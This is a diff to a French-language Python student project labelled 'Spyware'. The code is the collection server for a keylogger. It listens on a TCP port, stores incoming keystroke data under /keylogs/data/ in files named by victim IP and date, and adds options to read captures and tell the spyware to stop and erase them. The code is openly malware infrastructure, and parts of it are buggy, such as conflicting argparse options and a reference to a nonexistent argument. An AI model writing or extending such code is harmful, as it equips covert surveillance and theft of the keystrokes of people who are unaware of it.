@@ -6,16 +6,24 @@ import time
 from env import *
 import datetime
 
+TXT_GLOB = ""
+
 
 def argument():
-    p = argparse.ArgumentParser(description='NMAP MAIS EN MIEUX en faite.')
-    p.add_argument('-p', '--ping', action='store_true', help='Fais un scan via Ping, pour voir les machines UP')
-    p.add_argument('-s', '--socket', type=all,help="Recherche si le port spécifié est UP, mettre autre chose qu'un INT pour faire sur les 100 premiers ports")
-    p.add_argument('-o', action='store_true', help='Enregistre les resultats dans un fichier')
+    p = argparse.ArgumentParser(description='Projet Python - Spyware')
+    p.add_argument('-l', '--listen', type=int, action='store_true', help="se met en écoute sur le port TCP saisi par "
+                                                                         "l'utilisateur et attend les données du "
+                                                                         "spyware UP")
+    p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le "
+                                                             "programme")
+    p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur "
+                                                                 "du spyware. Le contenu doit être parfaitement "
+                                                                 "lisible")
+    p.add_argument('-k', '--kill', action='store_true',
+                   help="arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de "
+                        "supprimer la capture.")
     args = p.parse_args()
     return args
-
-
 
 
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -24,8 +32,11 @@ server_socket.bind(("0.0.0.0", PORT))
 
 server_socket.listen(5)
 
-def kill_all() :
-    print( "tout tuer ")
+
+def kill_all():
+    print("tout tuer ")
+
+
 def chrono():
     global TXT_GLOB
     while True:
@@ -34,11 +45,10 @@ def chrono():
             print(f"Secondes : {seconds}")
             seconds += 1
             time.sleep(1)
-            if seconds % 10 == 0 :
-                print("Ajout de data") #si pas de reponse du client, on kill tout
-            if seconds == 600 :
+            if seconds % 10 == 0:
+                print("Ajout de data")  # si pas de reponse du client, on kill tout
+            if seconds == 600:
                 kill_all()
-
 
 
 def commands(cmd):
@@ -46,12 +56,13 @@ def commands(cmd):
 
     client_socket.connect((SRV, PORT))
 
-    client_socket.send(cmd.encode('utf-8'))  ##envoi
+    client_socket.send(cmd.encode('utf-8'))  # envoi
 
     client_socket.close()
 
-def receiver():
-    print(f"Ecoute sur {SRV}:{PORT}")
+
+def receiver(port):
+    print(f"Ecoute sur {SRV}:{port}")
 
     while True:
         client_socket, client_address = server_socket.accept()
@@ -59,19 +70,38 @@ def receiver():
 
         ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
         # recu data
-        with open("/keylogs/data/"+ficname, "a") as f:
+        with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
             f.write(data.decode('utf-8'))
             print("connexion :" + ficname)
+
 
     client_socket.close()
     server_socket.close()
 
 
-receiver_t = threading.Thread(target=receiver)
+if __name__ == '__main__':
 
-receiver_t.start()
+    argument = argument()
 
-#commands_t = threading.Thread(target=commands)
+    if argument.listen:
 
-#commands_t.start()
+        port = argument.listen
+    else:
+        port = PORT
+
+    receiver_t = threading.Thread(target=receiver, args=(port,))
+
+    receiver_t.start()
+
+    if argument.r:
+        _, client_address = server_socket.getpeername()
+        ficname = f"{client_address[0]}-{datetime.date.today()}.txt"
+
+        with open("/keylogs/data/" + ficname, "r") as f:
+            file = f.read()
+            print(file)
+
+    # commands_t = threading.Thread(target=commands)
+
+    # commands_t.start()
